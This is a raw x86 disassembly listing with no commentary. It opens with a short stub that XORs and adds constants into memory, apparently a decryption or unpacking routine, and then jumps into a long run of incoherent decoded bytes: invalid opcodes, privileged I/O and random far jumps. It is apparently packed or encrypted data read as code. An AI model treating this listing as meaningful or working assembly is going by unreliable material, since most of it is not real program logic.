  40a2c1:	xor    DWORD PTR [eax],esi
  40a2c3:	mov    eax,DWORD PTR [ebp-0x4]
  40a2c6:	mov    edi,DWORD PTR [ebp+0x10]
  40a2c9:	xor    edi,ecx
  40a2cb:	mov    esi,0xffcd8d20
  40a2d0:	mov    ebx,esi
  40a2d2:	sub    ebx,edi
  40a2d4:	add    DWORD PTR [eax],ebx
  40a2d6:	mov    eax,DWORD PTR [ebp-0x4]
  40a2d9:	mov    edi,DWORD PTR [ebp-0x8]
  40a2dc:	add    edi,DWORD PTR [eax]
  40a2de:	mov    DWORD PTR [ebp-0x8],edi
  40a2e1:	mov    eax,DWORD PTR [ebp+0xc]
  40a2e4:	mov    edi,DWORD PTR [ebp+0xc]
  40a2e7:	xor    edi,ecx
  40a2e9:	jmp    0x40c634
  40a2ee:	neg    ch
  40a2f0:	jns    0x40a2c7
  40a2f2:	xchg   ecx,eax
  40a2f3:	mov    ch,0x76
  40a2f5:	popf   
  40a2f6:	outs   dx,BYTE PTR ds:[esi]
  40a2f7:	mov    ah,0x10
  40a2f9:	inc    esi
  40a2fa:	and    al,0x4
  40a2fd:	es add BYTE PTR cs:[edx+0x7a],bh
  40a302:	inc    esp
  40a303:	pop    edi
  40a304:	jp     0x40a380
  40a306:	outs   dx,BYTE PTR ds:[esi]
  40a307:	les    esp,FWORD PTR [ecx]
  40a309:	cli    
  40a30a:	lea    ebx,[eax-0x34]
  40a30d:	dec    ebx
  40a30e:	mov    ds:0x654db42c,al
  40a313:	xor    DWORD PTR [ebx],ecx
  40a315:	adc    al,0xea
  40a317:	loop   0x40a32f
  40a319:	fistp  DWORD PTR [ebp-0x1007e331]
  40a31f:	sub    DWORD PTR [ebx+0x14],ebx
  40a322:	and    edi,esi
  40a324:	mov    dh,0x44
  40a326:	or     ch,BYTE PTR ss:[ebx-0x7e]
  40a32a:	mov    ebx,0xd5f3f94c
  40a32f:	ja     0x40a30d
  40a331:	int    0x9
  40a333:	jno    0x40a2e9
  40a335:	push   cs
  40a336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a337:	jns    0x40a317
  40a339:	loopne 0x40a2f9
  40a33b:	or     BYTE PTR [ebx+0x71],cl
  40a33e:	stos   BYTE PTR es:[edi],al
  40a33f:	repz gs scas eax,DWORD PTR es:[edi]
  40a342:	(bad)  
  40a343:	out    dx,al
  40a344:	sti    
  40a345:	or     ebp,esi
  40a347:	xor    al,0x55
  40a349:	clc    
  40a34a:	cmc    
  40a34b:	pop    es
  40a34c:	or     eax,0xe1705f2f
  40a351:	icebp  
  40a352:	push   0x4a
  40a354:	jne    0x40a366
  40a356:	gs sbb ebx,esp
  40a359:	ds out 0xaf,al
  40a35c:	dec    eax
  40a35d:	jl     0x40a336
  40a35f:	ins    BYTE PTR es:[edi],dx
  40a360:	add    eax,0x39f38aba
  40a365:	lds    ebx,FWORD PTR [eax-0xd623451]
  40a36b:	hlt    
  40a36c:	fsub   QWORD PTR [edi+0x4e]
  40a36f:	jmp    0x36452a8f
  40a374:	mov    WORD PTR [esi+edi*8+0x2316b8df],?
  40a37b:	mov    ebp,0xae2a788f
  40a380:	mov    ecx,0xa5add17f
  40a385:	mov    eax,0x5ab7693f
  40a38a:	into   
  40a38b:	hlt    
  40a38c:	xchg   DWORD PTR [ebx+0x63],ebp
  40a38f:	xor    DWORD PTR [edi-0x188e505c],esi
  40a395:	into   
  40a396:	aam    0x9
  40a398:	(bad)  
  40a399:	cwde   
  40a39a:	repz push esi
  40a39c:	cmc    
  40a39d:	mov    esp,DWORD PTR [eax+ecx*4]
  40a3a0:	xor    DWORD PTR [esi+ebp*8],eax
  40a3a3:	and    eax,0xbf7ddd7
  40a3a8:	data16 (bad) 
  40a3aa:	or     cl,BYTE PTR [ecx-0x4d]
  40a3ad:	popf   
  40a3ae:	cwde   
  40a3af:	and    al,0x86
  40a3b1:	je     0x40a368
  40a3b3:	sub    dh,ah
  40a3b5:	mov    ah,0x19
  40a3b7:	xchg   esi,eax
  40a3b8:	sub    ch,BYTE PTR [edx-0x75]
  40a3bb:	xchg   edi,eax
  40a3bc:	push   edi
  40a3bd:	inc    edi
  40a3be:	test   eax,eax
  40a3c0:	pushf  
  40a3c1:	pop    eax
  40a3c2:	or     esp,DWORD PTR [ebp-0x52]
  40a3c5:	dec    eax
  40a3c6:	xchg   BYTE PTR [ecx-0x40],cl
  40a3c9:	jl     0x40a417
  40a3cb:	stos   DWORD PTR es:[edi],eax
  40a3cc:	aad    0xc2
  40a3ce:	fwait
  40a3cf:	and    ecx,0xffffff8b
  40a3d2:	cmp    BYTE PTR [edi-0x7d],dh
  40a3d5:	not    DWORD PTR [eax-0x3fb86754]
  40a3db:	imul   ebp,DWORD PTR [ebp-0x32e12cbb],0x87c0d976
  40a3e5:	and    esi,DWORD PTR [edx+ebx*4]
  40a3e8:	mov    al,0x4b
  40a3ea:	or     al,0xd
  40a3ec:	xchg   ebp,eax
  40a3ed:	fstp   DWORD PTR [edi]
  40a3ef:	mov    edx,0xf323798
  40a3f4:	imul   ecx,DWORD PTR [ecx+0x5a],0x53
  40a3f8:	dec    edx
  40a3f9:	fld    QWORD PTR [edx+0x66]
  40a3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3fd:	sbb    edx,DWORD PTR [ebx]
  40a3ff:	retf   0x1333
  40a402:	xchg   esi,eax
  40a403:	cli    
  40a404:	cmp    bl,BYTE PTR [ebx+0x56]
  40a407:	outs   dx,DWORD PTR ds:[esi]
  40a408:	aas    
  40a409:	cmp    eax,0xa532ee77
  40a40e:	cdq    
  40a40f:	je     0x40a3ed
  40a411:	push   0xfffffffe
  40a413:	stos   DWORD PTR es:[edi],eax
  40a414:	jnp    0x40a3e2
  40a416:	xor    eax,0xbf3fefb6
  40a41b:	jmp    0xcfbc:0x1452175f
  40a422:	cwde   
  40a423:	push   esi
  40a424:	push   esi
  40a425:	out    dx,eax
  40a426:	idiv   BYTE PTR [edx]
  40a428:	stos   DWORD PTR es:[edi],eax
  40a429:	pop    ds
  40a42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a42b:	les    esi,FWORD PTR [esi]
  40a42d:	jmp    0x597e:0x9283d05a
  40a434:	xor    al,0x46
  40a436:	icebp  
  40a437:	ds jo  0x40a4af
  40a43a:	or     BYTE PTR [ebx],0xf5
  40a43d:	xchg   edx,eax
  40a43e:	dec    esi
  40a43f:	fcmovnb st,st(7)
  40a441:	das    
  40a442:	jle    0x40a4b7
  40a444:	ds ds pop ebx
  40a447:	mov    al,0x49
  40a449:	fs push edx
  40a44b:	es xor eax,0x4de6142d
  40a451:	mov    edi,0xd5299f78
  40a456:	push   ss
  40a457:	(bad)  
  40a458:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a45a:	mov    ch,0x69
  40a45c:	repz adc BYTE PTR [eax+eiz*2+0x26],0x5c
  40a462:	adc    ah,dh
  40a464:	mov    ch,0x4e
  40a466:	psrad  mm1,QWORD PTR [edx]
  40a469:	cmp    al,0xd2
  40a46b:	pop    edx
  40a46c:	mov    ds:0x63ec8863,eax
  40a471:	xchg   esi,eax
  40a472:	xchg   BYTE PTR [esp+edx*4],dl
  40a475:	dec    edx
  40a476:	in     al,dx
  40a477:	inc    edi
  40a478:	es clc 
  40a47a:	lods   al,BYTE PTR ds:[esi]
  40a47b:	inc    edi
  40a47c:	(bad)  
  40a47d:	es sti 
  40a47f:	into   
  40a480:	mov    dh,0x16
  40a482:	inc    esp
  40a483:	mov    eax,0xf7fb4bb6
  40a488:	xchg   esp,eax
  40a489:	adc    BYTE PTR [esi+0x1d82f676],cl
  40a48f:	mov    DWORD PTR [ecx+0x3b8d877e],edx
  40a495:	jge    0x40a470
  40a497:	sbb    esp,ecx
  40a499:	cmp    ch,ah
  40a49b:	inc    ecx
  40a49c:	lahf   
  40a49d:	add    eax,0xdbf2246e
  40a4a2:	mov    esi,DWORD PTR [edi-0x21]
  40a4a5:	retf   0xb93
  40a4a8:	test   BYTE PTR ds:0x9dac09e2,al
  40a4ae:	jns    0x40a458
  40a4b0:	jecxz  0x40a44e
  40a4b2:	jge    0x40a4a0
  40a4b4:	mov    bl,0x18
  40a4b6:	cmp    DWORD PTR [edx],edi
  40a4b8:	mov    es,WORD PTR [eax-0xcd126d9]
  40a4be:	add    BYTE PTR [ecx+0x0],dl
  40a4c1:	mov    ebx,0x5c1b7d77
  40a4c6:	adc    edi,DWORD PTR [ebx+0x6b]
  40a4c9:	imul   esp,DWORD PTR [edx],0x21
  40a4cc:	outs   dx,DWORD PTR ds:[esi]
  40a4cd:	std    
  40a4ce:	fisub  WORD PTR [ecx+0x5e]
  40a4d1:	dec    eax
  40a4d2:	cwde   
  40a4d3:	rcl    DWORD PTR [esi-0x631724c],0xd
  40a4da:	das    
  40a4db:	cld    
  40a4dc:	fs retf 
  40a4de:	(bad)  
  40a4df:	data16 jl 0x40a556
  40a4e2:	push   esp
  40a4e3:	mov    WORD PTR [eax],ds
  40a4e5:	cmp    BYTE PTR [edi+esi*4-0x14],ah
  40a4e9:	xchg   edx,eax
  40a4ea:	das    
  40a4eb:	mov    bl,0x19
  40a4ed:	out    dx,al
  40a4ee:	xchg   edi,eax
  40a4ef:	movntq QWORD PTR [edi],mm2
  40a4f2:	add    ebx,ebp
  40a4f4:	ins    DWORD PTR es:[edi],dx
  40a4f5:	mov    edi,0xe9340e4c
  40a4fa:	inc    ecx
  40a4fb:	push   edx
  40a4fc:	lea    esp,[ebp+0x29e97c93]
  40a502:	sti    
  40a503:	mov    edi,0x6b48c9a0
  40a508:	rcr    DWORD PTR [ecx-0x51f4fc0b],1
  40a50e:	iret   
  40a50f:	inc    esp
  40a510:	add    dh,BYTE PTR [eax-0x35]
  40a513:	popa   
  40a514:	data16 jl 0x40a53f
  40a517:	cmp    esp,DWORD PTR ds:0xbacf9ac3
  40a51d:	ret    
  40a51e:	cmp    ecx,edx
  40a520:	sub    al,0x85
  40a523:	and    ch,BYTE PTR [eax+0x5ba289ac]
  40a529:	daa    
  40a52a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a52c:	dec    edx
  40a52d:	aam    0xf5
  40a52f:	shl    BYTE PTR [edi],1
  40a531:	retf   
  40a532:	push   eax
  40a533:	add    al,BYTE PTR [edi+0x3b]
  40a536:	mov    WORD PTR [edi],gs
  40a538:	aad    0x8e
  40a53a:	and    esi,edx
  40a53c:	cmc    
  40a53d:	mov    al,0x87
  40a53f:	mov    eax,0xba771a9b
  40a544:	ficom  WORD PTR [ebx+eax*8]
  40a547:	aaa    
  40a548:	pushf  
  40a549:	in     eax,dx
  40a54a:	in     eax,0x4a
  40a54c:	sub    esi,DWORD PTR [eax]
  40a54e:	push   es
  40a54f:	dec    edx
  40a550:	(bad)  
  40a552:	jmp    0xfa775ac9
  40a557:	sbb    DWORD PTR [eax+0x555c49f3],0xf1f02570
  40a561:	jecxz  0x40a585
  40a563:	inc    edx
  40a564:	test   BYTE PTR [di],cl
  40a567:	xlat   BYTE PTR ds:[ebx]
  40a568:	std    
  40a569:	faddp  st(2),st
  40a56b:	or     al,0xe0
  40a56d:	mov    BYTE PTR [edx-0x3d],ch
  40a570:	jmp    0x40a559
  40a572:	jo     0x40a5c4
  40a574:	imul   edi,DWORD PTR [ecx],0x57f02916
  40a57a:	sbb    ebx,ebx
  40a57c:	ds inc esi
  40a57e:	and    ebx,DWORD PTR [ebx]
  40a580:	or     BYTE PTR [edi],dh
  40a582:	ja     0x40a518
  40a584:	pop    es
  40a585:	shl    WORD PTR [esi],0xa4
  40a589:	mov    BYTE PTR [eax-0x2f],cl
  40a58c:	sbb    al,BYTE PTR [esi-0x22]
  40a58f:	mov    ch,0x4
  40a591:	or     BYTE PTR [edx-0x85a2a0f],bh
  40a597:	push   eax
  40a598:	xor    al,ah
  40a59a:	shr    BYTE PTR [esi+0x34e8a681],0x47
  40a5a1:	push   ebp
  40a5a2:	sti    
  40a5a3:	cli    
  40a5a4:	test   DWORD PTR [ebx*8+0x15fc54d0],eax
  40a5ab:	js     0x40a620
  40a5ad:	repnz pop esi
  40a5af:	xchg   BYTE PTR [esi-0x17],bl
  40a5b2:	in     al,0x60
  40a5b4:	sahf   
  40a5b5:	cmp    al,0xc7
  40a5b7:	pop    ss
  40a5b8:	xchg   esp,eax
  40a5b9:	mov    es,WORD PTR [ebp-0x321da77c]
  40a5bf:	adc    DWORD PTR [edx],edx
  40a5c1:	add    ecx,DWORD PTR [esi]
  40a5c3:	xchg   edx,eax
  40a5c4:	mov    ch,0xa2
  40a5c6:	sub    al,0xb5
  40a5c8:	int    0xcd
  40a5ca:	xchg   edx,eax
  40a5cb:	loopne 0x40a648
  40a5cd:	mov    ebp,0xcf3d0997
  40a5d2:	test   edx,ecx
  40a5d4:	test   al,0x22
  40a5d6:	call   FWORD PTR [esi]
  40a5d8:	pop    esi
  40a5d9:	jp     0x40a5d6
  40a5db:	push   ebp
  40a5dc:	or     DWORD PTR [edx+0x2cfb8952],0xffffffd5
  40a5e3:	xor    al,0xf0
  40a5e5:	aad    0x3
  40a5e7:	iret   
  40a5e8:	pop    esi
  40a5e9:	xor    DWORD PTR [ebp-0xa],esp
  40a5ec:	(bad)  
  40a5ed:	in     al,dx
  40a5ee:	adc    dh,BYTE PTR [eax+0x674c94ed]
  40a5f4:	les    eax,FWORD PTR [esi+0x7dc89c23]
  40a5fa:	jnp    0x40a649
  40a5fc:	test   eax,0xb426caf9
  40a601:	mov    WORD PTR [esi+0x52],?
  40a604:	pop    esi
  40a605:	mov    ecx,0x796eedad
  40a60a:	push   ecx
  40a60b:	pop    es
  40a60c:	mov    eax,0x9e531f6a
  40a611:	and    BYTE PTR [edx],0x3
  40a614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a615:	push   DWORD PTR [eax+0x1b1700de]
  40a61b:	or     al,BYTE PTR [edi+0x37]
  40a61e:	jbe    0x40a5fe
  40a620:	data16 mov ah,0x14
  40a623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a624:	stos   BYTE PTR es:[edi],al
  40a625:	jb     0x40a64e
  40a627:	mov    bl,0xf9
  40a629:	fst    QWORD PTR [ebx+0x3b201db3]
  40a62f:	scas   al,BYTE PTR es:[edi]
  40a630:	aam    0xf2
  40a632:	imul   ebx,DWORD PTR [edi+0x52],0xde5cf9b6
  40a639:	push   ebp
  40a63a:	adc    ch,BYTE PTR [edi-0x3a4a31c3]
  40a640:	mov    dh,0x8c
  40a642:	cmp    DWORD PTR [edx-0x6ff4969e],0x22
  40a649:	jo     0x40a5e5
  40a64b:	or     esp,DWORD PTR [edx-0xdadbab6]
  40a651:	and    BYTE PTR ds:0x82e82d7c,dh
  40a657:	jae    0x40a6d4
  40a659:	xlat   BYTE PTR ds:[ebx]
  40a65a:	inc    ebx
  40a65b:	repnz adc DWORD PTR fs:[edi-0x40],0x5a
  40a661:	mov    ch,0xf7
  40a663:	stos   DWORD PTR es:[edi],eax
  40a664:	push   eax
  40a665:	shr    DWORD PTR [ebp-0x6d],0xb1
  40a669:	cwde   
  40a66a:	inc    ebp
  40a66b:	mov    ecx,0xcd211954
  40a670:	sbb    ecx,DWORD PTR ds:0x1d9a25a0
  40a676:	dec    ebx
  40a677:	inc    ebx
  40a678:	out    0x15,al
  40a67a:	and    al,0x14
  40a67c:	int3   
  40a67d:	sub    esp,DWORD PTR [edx-0x45ca54fd]
  40a683:	sbb    WORD PTR [esi],0x5590
  40a688:	add    edi,edi
  40a68a:	pop    esp
  40a68b:	test   al,0x6b
  40a68d:	imul   edi,DWORD PTR [ebx-0xfde499c],0xcd248b73
  40a697:	stos   BYTE PTR es:[edi],al
  40a698:	adc    bh,BYTE PTR [edx-0x3a]
  40a69b:	popf   
  40a69c:	adc    eax,0xe8cf638d
  40a6a1:	cli    
  40a6a2:	sbb    DWORD PTR ds:0x4ac1a928,eax
  40a6a8:	push   esp
  40a6a9:	aaa    
  40a6aa:	or     bl,cl
  40a6ac:	addr16 ja 0x40a6e4
  40a6af:	dec    ecx
  40a6b0:	(bad)  
  40a6b1:	into   
  40a6b2:	and    edx,DWORD PTR [esi+ecx*8]
  40a6b5:	jmp    0xa4a5:0xab780669
  40a6bc:	lods   al,BYTE PTR ds:[esi]
  40a6bd:	sbb    BYTE PTR [edx+0x7b],0xd0
  40a6c1:	mov    esp,0x50563098
  40a6c6:	mov    ds:0x108ec310,eax
  40a6cb:	and    eax,0x9d75976
  40a6d0:	sbb    eax,0x711abdcc
  40a6d5:	pusha  
  40a6d6:	pop    esi
  40a6d7:	es jae 0x40a74b
  40a6da:	loopne 0x40a6d2
  40a6dc:	adc    BYTE PTR [esi+0x15],dh
  40a6df:	jo     0x40a6a7
  40a6e1:	mov    ebp,0x7e22599c
  40a6e6:	gs adc ch,bl
  40a6e9:	test   eax,0xdd941809
  40a6ee:	icebp  
  40a6ef:	(bad)  
  40a6f0:	sti    
  40a6f1:	ins    BYTE PTR es:[edi],dx
  40a6f2:	mov    ebp,0xff095c4a
  40a6f7:	leave  
  40a6f8:	loopne 0x40a6f4
  40a6fa:	pop    esi
  40a6fb:	push   eax
  40a6fc:	xchg   ebx,eax
  40a6fd:	ja     0x40a753
  40a6ff:	repnz cmp ah,BYTE PTR [ebp+edx*2+0x6a383c8a]
  40a707:	mov    eax,0x67ab1c9a
  40a70c:	(bad)  
  40a70d:	ficom  DWORD PTR [ebx-0x24729a86]
  40a713:	lods   al,BYTE PTR ds:[esi]
  40a714:	pop    ebp
  40a715:	xlat   BYTE PTR ds:[ebx]
  40a716:	sbb    edx,DWORD PTR [ecx-0x13050fe0]
  40a71c:	(bad)
  40a720:	xchg   esp,eax
  40a721:	sub    edx,DWORD PTR [edi+0x72]
  40a724:	test   BYTE PTR [eax+0x10],ah
  40a727:	jle    0x40a6fb
  40a729:	push   ecx
  40a72a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a72c:	or     eax,0x4a1e3a03
  40a731:	sub    ch,BYTE PTR [ebx]
  40a733:	ror    BYTE PTR [esi+0x642b5ccf],1
  40a739:	pop    ss
  40a73a:	push   esi
  40a73b:	jg     0x40a709
  40a73d:	cs jb  0x40a761
  40a740:	inc    edx
  40a741:	out    0xe7,eax
  40a743:	or     bl,BYTE PTR [ecx]
  40a745:	(bad)  
  40a746:	dec    eax
  40a747:	push   0x30fec5d5
  40a74c:	xor    al,0x61
  40a74e:	xchg   edi,eax
  40a74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a750:	add    eax,0x487ea42
  40a755:	cwde   
  40a756:	mov    DWORD PTR [ecx+ebx*4-0x4899bff0],eax
  40a75d:	int3   
  40a75e:	add    bl,BYTE PTR [ecx+0x2a]
  40a761:	xlat   BYTE PTR ds:[ebx]
  40a762:	inc    eax
  40a763:	add    cl,cl
  40a765:	dec    ebx
  40a766:	mov    esi,0x7e5d85ad
  40a76b:	fs inc ebx
  40a76d:	push   esp
  40a76e:	inc    ecx
  40a76f:	and    ebx,ebx
  40a771:	int3   
  40a772:	test   bl,ah
  40a774:	dec    edi
  40a775:	inc    edx
  40a776:	ja     0x40a7be
  40a778:	(bad)  
  40a779:	loop   0x40a7cd
  40a77b:	popf   
  40a77c:	xor    esp,edi
  40a77e:	ffree  st(6)
  40a780:	loope  0x40a7ec
  40a782:	rcr    DWORD PTR [esi-0x4d],1
  40a785:	cs je  0x40a77f
  40a788:	mov    ds:0x8f28f3b6,al
  40a78d:	test   al,0x47
  40a78f:	adc    al,0x91
  40a791:	loope  0x40a719
  40a793:	push   ecx
  40a794:	call   0x1447ca1a
  40a799:	out    0xd0,al
  40a79b:	sti    
  40a79c:	jae    0x40a7f3
  40a79e:	ror    BYTE PTR [ecx+0x7858fe6f],1
  40a7a4:	rcr    BYTE PTR [esi-0x69],0xee
  40a7a8:	sahf   
  40a7a9:	loopne 0x40a788
  40a7ab:	imul   ebp,DWORD PTR [esi+ecx*8+0x41],0x5f3976cb
  40a7b3:	repnz aad 0x14
  40a7b6:	rol    esp,cl
  40a7b8:	adc    eax,0x255d2427
  40a7bd:	pop    edi
  40a7be:	or     BYTE PTR [ebx],0xd0
  40a7c1:	inc    edi
  40a7c2:	cwde   
  40a7c3:	jbe    0x40a7d7
  40a7c5:	jecxz  0x40a74d
  40a7c7:	repz xor al,0x5e
  40a7ca:	pop    es
  40a7cb:	sbb    ax,0x1f80
  40a7cf:	je     0x40a850
  40a7d1:	adc    ebx,DWORD PTR [esi]
  40a7d3:	mov    ecx,ecx
  40a7d5:	push   es
  40a7d6:	lods   al,BYTE PTR ss:[esi]
  40a7d8:	ins    BYTE PTR es:[edi],dx
  40a7d9:	outs   dx,DWORD PTR ds:[esi]
  40a7da:	sub    edi,DWORD PTR [edx+ebp*2+0x692cbe4c]
  40a7e1:	xchg   esi,eax
  40a7e2:	sub    eax,0xcc66fabd
  40a7e7:	(bad)  
  40a7e8:	std    
  40a7e9:	frstor [edi-0x1426652]
  40a7ef:	imul   esp,DWORD PTR [eax+edx*2],0x52307cec
  40a7f6:	and    al,0x44
  40a7f8:	cmp    al,0xca
  40a7fa:	ror    DWORD PTR [edx],cl
  40a7fc:	pop    ecx
  40a7fd:	mov    bl,0x78
  40a7ff:	mov    WORD PTR [eax+0x4f987ae3],ss
  40a805:	repnz iret 
  40a807:	mov    edi,0x419b3d80
  40a80c:	jl     0x40a880
  40a80e:	adc    ebp,DWORD PTR [ebp+0x1cff4eb6]
  40a814:	xchg   esi,eax
  40a815:	std    
  40a816:	fisttp DWORD PTR [eax-0x890192f]
  40a81c:	adc    BYTE PTR [eax+0x6dd50771],al
  40a822:	mov    al,ds:0xce1eff9
  40a827:	xchg   esi,eax
  40a828:	enter  0xba05,0x3d
  40a82c:	and    al,0xc0
  40a82e:	hlt    
  40a82f:	or     ch,0x65
  40a832:	push   ss
  40a833:	push   0x46
  40a835:	and    eax,0x1b3ab713
  40a83a:	xor    eax,0xb8f88a74
  40a83f:	mov    cl,0xe4
  40a841:	sub    bl,dl
  40a843:	shl    BYTE PTR [ebx+edx*4-0x38513d90],cl
  40a84a:	cli    
  40a84b:	mov    eax,0x2d3cd280
  40a850:	pop    es
  40a851:	hlt    
  40a852:	cmp    DWORD PTR [edx-0x7f7dbae7],eax
  40a858:	add    si,ax
  40a85b:	or     al,0x3f
  40a85d:	pop    edx
  40a85e:	inc    ebp
  40a85f:	shl    ecx,1
  40a861:	call   0x90db:0xb093d7c
  40a868:	cmp    eax,0x7282c62e
  40a86d:	jns    0x40a893
  40a86f:	pop    ecx
  40a870:	div    esi
  40a872:	ficomp WORD PTR [edx+0x73]
  40a875:	xor    eax,0xdf638a79
  40a87a:	mul    BYTE PTR [esi]
  40a87c:	das    
  40a87d:	sub    BYTE PTR [ebx+0x25],0x49
  40a881:	or     eax,0x93143ad4
  40a886:	pop    DWORD PTR [edx-0x5f]
  40a889:	les    ebx,FWORD PTR [edi]
  40a88b:	mov    edi,0xcc6aa485
  40a890:	mov    al,ds:0x3b457ddd
  40a895:	fwait
  40a896:	sub    eax,0xaeda9cb1
  40a89b:	imul   eax,DWORD PTR [edi-0x63],0x76
  40a89f:	leave  
  40a8a0:	adc    DWORD PTR [eax-0x42fec70],0xb462f1c8
  40a8aa:	ror    BYTE PTR [eax-0x1214fef1],0xf3
  40a8b1:	mov    WORD PTR [ebx+0x51],?
  40a8b4:	mov    al,ds:0x1c14cd63
  40a8b9:	sub    ecx,ecx
  40a8bb:	add    al,0xda
  40a8bd:	shr    DWORD PTR [edx-0x6e2e0521],cl
  40a8c3:	nop
  40a8c4:	push   esi
  40a8c5:	pop    ss
  40a8c6:	and    ebx,eax
  40a8c8:	inc    ebx
  40a8c9:	call   0x12b9e219
  40a8ce:	enter  0xf382,0xfb
  40a8d2:	push   cs
  40a8d3:	mov    al,0xc9
  40a8d5:	jmp    0xaa5fed25
  40a8da:	inc    dl
  40a8dc:	jnp    0x40a887
  40a8de:	push   ebx
  40a8df:	jno    0x40a871
  40a8e1:	stos   DWORD PTR es:[edi],eax
  40a8e2:	enter  0xa738,0xaa
  40a8e6:	push   esi
  40a8e7:	mov    edx,0xf3128063
  40a8ec:	jno    0x40a958
  40a8ee:	imul   ebx,DWORD PTR [edi+0xf6d55cd],0x36
  40a8f5:	xchg   DWORD PTR [edx-0x1d],eax
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	xchg   ebx,eax
  40a8fa:	mov    eax,0x4d67940d
  40a8ff:	scas   eax,DWORD PTR es:[edi]
  40a900:	adc    dl,ah
  40a902:	sbb    BYTE PTR [esi+0x4d3c626d],bh
  40a908:	in     al,dx
  40a909:	adc    BYTE PTR [eax+eiz*8],ch
  40a90c:	or     DWORD PTR [ebp-0x6d],ecx
  40a90f:	retf   
  40a910:	and    eax,0x3c960441
  40a915:	push   ecx
  40a916:	mov    ecx,0x9efc88ff
  40a91b:	xor    dh,cl
  40a91d:	dec    edx
  40a91e:	mov    ds:0xe08c7cbf,eax
  40a923:	and    eax,DWORD PTR ds:0x462bdeeb
  40a929:	or     al,0x78
  40a92b:	sbb    edx,edx
  40a92d:	mov    ebx,DWORD PTR [edx]
  40a92f:	sub    ch,bh
  40a931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a932:	(bad)  
  40a933:	jmp    0x40a933
  40a935:	dec    esp
  40a936:	push   es
  40a937:	adc    bh,dh
  40a939:	cs ret 0x9691
  40a93d:	xchg   DWORD PTR [edx],esp
  40a93f:	jl     0x40a99d
  40a941:	xchg   ebp,edx
  40a943:	rol    DWORD PTR [edx-0x3df95528],0x3
  40a94a:	sub    eax,0x15202857
  40a94f:	sub    BYTE PTR [edx+0x1d],dh
  40a952:	dec    esp
  40a953:	adc    BYTE PTR [edx+0x1c],0xe9
  40a957:	dec    ebp
  40a958:	mov    ebx,DWORD PTR [edx-0x2b]
  40a95b:	jbe    0x40a967
  40a95d:	dec    esp
  40a95e:	pop    esp
  40a95f:	dec    ecx
  40a960:	cmc    
  40a961:	inc    esp
  40a962:	test   eax,0x88913692
  40a967:	add    ecx,DWORD PTR [ecx-0x79]
  40a96a:	fld    TBYTE PTR [esi-0x5e]
  40a96d:	shl    DWORD PTR [eax+0x6e],cl
  40a970:	adc    dh,BYTE PTR [edi-0x11]
  40a973:	and    eax,0xc9c0711a
  40a978:	jl     0x40a9e5
  40a97a:	inc    edx
  40a97b:	pop    edi
  40a97c:	dec    edi
  40a97d:	or     al,0x8a
  40a97f:	div    BYTE PTR [eax-0x62]
  40a982:	scas   eax,DWORD PTR es:[edi]
  40a983:	mov    bh,0x0
  40a985:	add    al,BYTE PTR [edi+0x4eadf2d9]
  40a98b:	and    edx,DWORD PTR [ebx]
  40a98d:	inc    eax
  40a98e:	addr16 icebp 
  40a990:	call   0x6b85:0xbb7fefe8
  40a997:	test   BYTE PTR [esi-0x54fdeb15],al
  40a99d:	sub    eax,0xb13830f9
  40a9a2:	(bad)  
  40a9a3:	repz or ebp,eax
  40a9a6:	push   ebx
  40a9a7:	ror    DWORD PTR [eax],1
  40a9a9:	retf   0xaf92
  40a9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ad:	xchg   BYTE PTR [esi-0x34],dl
  40a9b0:	push   ebx
  40a9b1:	hlt    
  40a9b2:	jmp    DWORD PTR [eax]
  40a9b4:	in     al,dx
  40a9b5:	adc    eax,0x48abc144
  40a9ba:	iret   
  40a9bb:	enter  0x5c01,0x9f
  40a9bf:	repnz sub DWORD PTR [ecx],ebx
  40a9c2:	stc    
  40a9c3:	push   ss
  40a9c4:	ror    esi,cl
  40a9c6:	or     edi,DWORD PTR [ebx]
  40a9c8:	out    dx,al
  40a9c9:	sar    DWORD PTR [esp+ebx*1-0x1e],1
  40a9cd:	dec    eax
  40a9ce:	add    al,0x4f
  40a9d0:	mov    eax,ds:0x100c60c6
  40a9d5:	bound  ebp,QWORD PTR [eax+eiz*2-0x1c486144]
  40a9dc:	mov    edx,0xdbaa7f74
  40a9e1:	or     eax,0x4dd7d418
  40a9e6:	out    0xe8,eax
  40a9e8:	and    eax,0x52eea73
  40a9ed:	mov    ebp,0xedc4a3f7
  40a9f2:	pop    edx
  40a9f3:	sub    DWORD PTR [eax-0x50048a6e],esi
  40a9f9:	repnz xor al,BYTE PTR [ebp+eax*1+0x36]
  40a9fe:	fist   WORD PTR [ebx+0x71]
  40aa01:	ret    0x1a75
  40aa04:	nop
  40aa05:	aad    0x2e
  40aa07:	push   eax
  40aa08:	or     BYTE PTR [edi+0x740f5c88],ah
  40aa0e:	inc    edi
  40aa0f:	aam    0xb6
  40aa11:	jecxz  0x40a9f9
  40aa13:	pop    ds
  40aa14:	daa    
  40aa15:	shl    DWORD PTR [edi+0x31],1
  40aa18:	jmp    0x12d8a056
  40aa1d:	dec    edi
  40aa1e:	xor    edi,DWORD PTR [ebp-0x149b3f29]
  40aa24:	push   edx
  40aa25:	rcr    DWORD PTR [edi+0x55],cl
  40aa28:	push   ecx
  40aa29:	ins    DWORD PTR es:[edi],dx
  40aa2a:	out    dx,al
  40aa2b:	fsubr  QWORD PTR [edx]
  40aa2d:	int3   
  40aa2e:	dec    esp
  40aa2f:	push   0x1f4ed376
  40aa34:	js     0x40a9f6
  40aa36:	mov    ds:0x77468a6e,al
  40aa3b:	xchg   edx,eax
  40aa3c:	and    DWORD PTR [ecx],0xbfec25a6
  40aa42:	lods   eax,DWORD PTR ds:[esi]
  40aa43:	int3   
  40aa44:	xchg   ecx,eax
  40aa45:	pop    esi
  40aa46:	cmp    ch,bl
  40aa48:	push   edi
